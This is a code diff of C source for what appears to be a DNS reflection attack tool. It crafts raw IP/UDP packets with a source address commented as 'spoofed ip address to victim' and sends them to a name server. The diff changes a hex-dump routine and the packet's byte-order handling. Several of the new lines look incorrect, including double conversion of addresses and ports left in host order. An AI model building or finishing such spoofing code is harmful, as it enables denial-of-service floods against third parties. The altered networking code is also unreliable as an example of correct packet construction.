@@ -226,10 +226,14 @@ main(int argc, char** argv)
     sendto(raw_sockfd, pktbuf, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
     close(raw_sockfd);
 #else 
-    for (int i = 0; i < NS_PACKETSZ - buflen; i++)
-        printf("%x ", datagram[ i ]);
+    for (int i = 0; i < NS_PACKETSZ - buflen; i++) {
+        if (i % 16 == 0)
+            printf("\n");
+        if (i % 2 == 0)
+            printf(" ");
+        printf("%.2x", datagram[ i ]);
+    }
 #endif
-
     return 0;
 fail_close:
 #if !DEBUG
@@ -247,11 +251,11 @@ pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const ch
     iphdr->version = IPVER;
     iphdr->ihl = IHL_MIN;
     iphdr->tot_len = sizeof(IPHEADER) + nwritten + udpsz;
-    iphdr->id = htons(ID);
+    iphdr->id = ID;
     iphdr->ttl = 0xff;
     iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->saddr = inet_addr(sourceip); // spoofed ip address to victim
-    iphdr->daddr = inet_addr(destip); // name server 
+    iphdr->saddr = htonl(inet_addr(sourceip)); // spoofed ip address to victim
+    iphdr->daddr = htonl(inet_addr(destip)); // name server 
 
     memset(pseudohdr, 0, sizeof(PSEUDOHDR));
     pseudohdr->protocol = iphdr->protocol;
@@ -276,9 +280,9 @@ pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char
     }
 
     memset(udphdr, 0, sizeof(UDPHEADER));
-    udphdr->uh_dport = htons(dport_uint16); // nameserver port
-    udphdr->uh_sport = htons(sport_uint16); // victim port
-    udphdr->uh_ulen = htons(nwritten + sizeof(UDPHEADER));
+    udphdr->uh_dport = (dport_uint16); // nameserver port
+    udphdr->uh_sport = (sport_uint16); // victim port
+    udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);
     pseudohdr->udplen = udphdr->uh_ulen;
 
     udphdr->check = checksum(( const long* ) &pseudohdr, ( int ) sizeof(PSEUDOHDR));
